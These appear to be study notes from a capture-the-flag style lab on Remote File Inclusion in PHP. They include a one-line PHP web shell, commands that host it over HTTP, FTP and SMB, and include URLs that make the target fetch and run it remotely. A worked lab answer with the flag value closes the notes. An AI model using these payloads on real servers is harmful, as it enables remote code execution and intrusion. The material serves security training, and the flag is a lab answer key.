# Remote File Inclusion (RFI)
## Local vs. Remote File Inclusion

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"><strong class="font-bold">Function</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Read Content</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Execute</strong></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4" align="center"><strong class="font-bold">Remote URL</strong></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">PHP</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include()</code>/<code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include_once()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">file_get_contents()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">❌</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">Java</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">import</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><strong class="font-bold">.NET</strong></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td><td class="p-4" align="center"></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">@Html.RemotePartial()</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">❌</td><td class="p-4" align="center">✅</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">include</code></td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td><td class="p-4" align="center">✅</td></tr></tbody></table>

## Verify RFI
Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. 

Start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures:

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

## Remote Code Execution with RFI
Host the shell
```
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

# HTTP
$ sudo python3 -m http.server <LISTENING_PORT>
# RFI: http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>/shell.php&cmd=id

# FTP
$ sudo python -m pyftpdlib -p 21
# RFI: http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

# SMB
$ impacket-smbserver -smb2support share $(pwd)
# RFI: http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

## Questions
1. Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in / **Answer: 99a8fc05f033f2fc0cf9a6f9826f83f4**
   - Host a `shell.php` locally:
   - Abuse the RFI to gain RCE, find the flag and read it:
        ```
        GET /index.php?language=http://10.10.14.162:8000/shell.php&cmd=find+/+-name+'*flag*' HTTP/1.1
        
        <SNIP>
        /exercise/flag.txt
        <SNIP>
        ```
        ```
        GET /index.php?language=http://10.10.14.162:8000/shell.php&cmd=cat+/exercise/flag.txt HTTP/1.1
        
        <SNIP>
        99a8fc05f033f2fc0cf9a6f9826f83f4
        <SNIP>
        ```
